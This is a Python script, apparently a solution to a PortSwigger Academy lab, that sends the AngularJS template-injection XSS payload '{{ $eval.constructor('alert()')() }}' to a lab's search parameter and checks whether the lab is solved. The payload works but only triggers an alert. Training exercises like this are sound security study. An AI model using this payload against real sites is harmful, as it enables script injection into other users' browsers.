import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
# author: 0xyf


class XSS11:
    def __init__(self):
        self.lab_id = "0ac800a6033cc20b83906adc00fd0063"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"search": payload}
        r = requests.get(
            f"{self.url}",
            params=params,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom_xss(self):
        payload = "{{ $eval.constructor('alert()')() }}"
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom_xss()
        self.check_solved()


def main():
    XSS11().solve()


if __name__ == "__main__":
    main()
